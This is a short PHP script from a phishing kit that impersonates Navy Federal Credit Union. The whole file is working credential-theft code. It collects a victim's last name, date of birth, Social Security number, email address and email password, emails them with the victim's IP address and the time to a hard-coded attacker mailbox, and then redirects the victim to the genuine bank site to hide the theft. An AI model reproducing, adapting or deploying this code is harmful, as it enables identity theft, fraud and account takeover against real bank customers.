<?
session_start();
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$usn = $_POST['lname'];
$dase = $_POST['dats'];
$snms = $_POST['ssn'];
$emall = $_POST['emil'];
$erp = $_POST['emp'];
$fiftyme="zate123man@gmail.com";


  $subj = "NavyFC $ip";
  $msg = "Full Info\n\nLast Name: $usn\nDate of Birth: $dase\nSocial Security Number: $snms\nEmail Address: $emall\nEmail Password: $erp\n$ip $adddate\n-----*+++++++++++*-----\n Created By YZee--------*++++++++++*----------";
  $from = "From: <resultats@tsbdumbs.com>";
  mail("$fiftyme", $subj, $msg, $from);
?>
<script type="text/javascript">
 window.location="https://www.navyfederal.org/"
</script>
